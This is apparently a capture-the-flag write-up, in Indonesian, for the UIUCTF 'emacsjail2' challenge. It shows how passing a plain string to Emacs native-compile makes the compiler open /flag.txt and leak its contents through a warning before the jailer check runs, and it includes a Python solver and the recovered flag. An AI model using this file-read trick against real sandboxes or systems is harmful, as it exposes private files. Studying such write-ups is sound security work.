# emacsjail2

## Ringkasan

Challenge ini memberikan sebuah interpreter **GNU Emacs 30.2** yang menerima input Emacs Lisp.

Program melakukan beberapa tahap:

1. Membaca input dari user.
2. Melakukan parsing menggunakan `read-from-string`.
3. Melakukan native compilation.
4. Mengecek hasil native code menggunakan jailer.
5. Jika lolos, menjalankan fungsi hasil compilation.

Tujuan challenge adalah mendapatkan flag tanpa melakukan operasi yang secara eksplisit diblok oleh jailer.

Flag:

```text
uiuctf{7ry_f34rl3ss_c0ncurr3ncy_n3x7}
```

---

## Analisis Program

Source utama challenge kurang lebih melakukan:

```lisp
(let ((input (read-string "Input: ")))
  (let ((code (read-from-string input)))
    (setq code (car code))

    (let ((compiled
           (native-compile code
             (make-temp-file "emacsjail2"))))

      (if (check compiled)
          nil
        (panic "jailer does not approve of your program"))

      (message "%s" (funcall compiled)))))
```

Hal pentingnya adalah:

```lisp
(native-compile code ...)
```

Input user tidak langsung dieksekusi sebagai Lisp biasa.

Input terlebih dahulu dibaca menggunakan:

```lisp
read-from-string
```

kemudian hasilnya diberikan kepada:

```lisp
native-compile
```

---

## Input Harus Berupa Lisp Expression

Normalnya kita dapat memberikan sebuah function:

```lisp
(lambda ()
  (+ 1 1))
```

Function tersebut kemudian akan di-native-compile dan dijalankan.

Masalahnya, native compiler memiliki behavior lain ketika objek yang diberikan bukan function tetapi sebuah string.

---

# Percobaan Awal

## 1. Read-time Evaluation `#.`

Percobaan pertama adalah menggunakan fitur read-time evaluation:

```lisp
(lambda ()
  #.(insert-file-contents "/flag.txt"))
```

Payload tersebut gagal dengan:

```text
Invalid read syntax: "#."
```

Penyebabnya adalah Emacs menjalankan reader dengan:

```lisp
read-eval = nil
```

Sehingga read-time evaluation menggunakan `#.` dinonaktifkan.

---

## 2. `load-time-value`

Percobaan berikutnya:

```lisp
(lambda ()
  (load-time-value
    (insert-file-contents "/flag.txt")))
```

Payload tersebut juga gagal.

Output:

```text
jailer does not approve of your program
```

Masalahnya adalah native compiler menghasilkan native code yang mengandung function call untuk operasi tersebut.

Jailer kemudian mendeteksi dan menolak hasil compilation.

---

# Vulnerability

Kesalahan utama terdapat pada asumsi bahwa hanya **executable code** yang dapat membocorkan informasi.

Program melakukan:

```lisp
(native-compile code ...)
```

Jika `code` berupa string:

```lisp
"/flag.txt"
```

Emacs tidak memperlakukannya sebagai function.

Sebaliknya, native compiler menganggap string tersebut sebagai **nama file source Lisp yang harus dikompilasi**.

Dengan kata lain:

```lisp
(native-compile "/flag.txt")
```

akan membuat compiler membuka:

```text
/flag.txt
```

dan membaca isinya sebagai source Lisp.

Ini memungkinkan isi file muncul dalam output compiler meskipun hasil native code nantinya ditolak oleh jailer.

---

# Exploit

Payload yang digunakan sangat sederhana:

```lisp
"/flag.txt"
```

Secara praktis payload yang dikirim:

```text
"/flag.txt"
```

Ketika program memprosesnya:

```lisp
(read-from-string "\"/flag.txt\"")
```

hasilnya adalah string:

```text
/flag.txt
```

Kemudian string tersebut diberikan ke:

```lisp
(native-compile "/flag.txt" ...)
```

Native compiler membuka file tersebut.

Isi `/flag.txt` adalah:

```text
uiuctf{7ry_f34rl3ss_c0ncurr3ncy_n3x7}
```

Karena isi file dibaca sebagai source Lisp, compiler memberikan warning seperti:

```text
Warning: reference to free variable
uiuctf{7ry_f34rl3ss_c0ncurr3ncy_n3x7}
```

Dengan demikian flag sudah muncul pada output sebelum jailer menghentikan program.

---

# Kenapa Jailer Tidak Menjadi Masalah?

Jailer memang menolak hasil native compilation.

Output akhirnya:

```text
jailer does not approve of your program
```

Namun hal tersebut terjadi **setelah compiler membaca file**.

Urutannya:

```text
Input
  |
  v
read-from-string
  |
  v
"/flag.txt"
  |
  v
native-compile
  |
  +----> buka /flag.txt
  |
  +----> baca isi file
  |
  +----> compiler menghasilkan warning
  |
  v
check compiled
  |
  v
jailer menolak
```

Informasi yang kita inginkan sudah bocor pada tahap compilation.

Jadi kita tidak perlu membuat program yang berhasil melewati jailer.

---

# Exploit Chain

Secara singkat:

```text
"/flag.txt"
     |
     v
read-from-string
     |
     v
String "/flag.txt"
     |
     v
native-compile
     |
     v
Emacs menganggap string sebagai filename
     |
     v
/flag.txt dibuka
     |
     v
Isi file dibaca sebagai Lisp source
     |
     v
Compiler warning
     |
     v
FLAG muncul
     |
     v
Jailer menolak compilation
```

Jailer rejection tidak menjadi masalah karena flag sudah terlihat pada output.

---

# Solver

Solver Python:

```python
#!/usr/bin/env python3

import socket
import ssl
import re


HOST = "emacsjail2.chal.uiuc.tf"
PORT = 1337


payload = b'"/flag.txt"\n'


def main():

    s = socket.create_connection((HOST, PORT))

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    s = ctx.wrap_socket(
        s,
        server_hostname=HOST
    )

    while True:
        data = s.recv(4096)

        if not data:
            break

        print(data.decode(errors="ignore"))

        if b"Input:" in data:
            s.sendall(payload)

    s.close()


if __name__ == "__main__":
    main()
```

---

# Cara Menjalankan

Simpan solver sebagai:

```text
solve.py
```

Kemudian:

```bash
python3 solve.py
```

Solver akan:

1. Membuka koneksi TCP ke service.
2. Membungkus koneksi menggunakan TLS.
3. Menunggu prompt `Input:`.
4. Mengirim:
   ```text
   "/flag.txt"
   ```
5. Membaca output compiler.

---

# Output

Output yang diperoleh:

```text
Input:

In toplevel form:
flag.txt:1:1:
Warning: reference to free variable
uiuctf{7ry_f34rl3ss_c0ncurr3ncy_n3x7}

jailer does not approve of your program
```

Walaupun program akhirnya memberikan:

```text
jailer does not approve of your program
```

flag sudah berhasil dibocorkan oleh native compiler sebelumnya.

---

# Kesimpulan

Challenge ini memanfaatkan behavior `native-compile` yang tidak diperhitungkan oleh sandbox.

Program mengharapkan input berupa function Lisp, tetapi tidak memvalidasi tipe input sebelum memanggil:

```lisp
(native-compile code ...)
```

Ketika `code` berupa string:

```lisp
"/flag.txt"
```

Emacs memperlakukannya sebagai nama file source dan membaca file tersebut saat proses compilation.

Akibatnya isi flag muncul melalui warning compiler.

Jadi exploit tidak perlu:

- melewati `SecurityManager` atau jailer,
- melakukan read file dari native code,
- menggunakan `#.`,
- menggunakan `load-time-value`,
- atau membuat native payload yang lolos pemeriksaan.

Cukup gunakan:

```lisp
"/flag.txt"
```

dan ambil flag dari output compiler.

## Flag

```text
uiuctf{7ry_f34rl3ss_c0ncurr3ncy_n3x7}
```
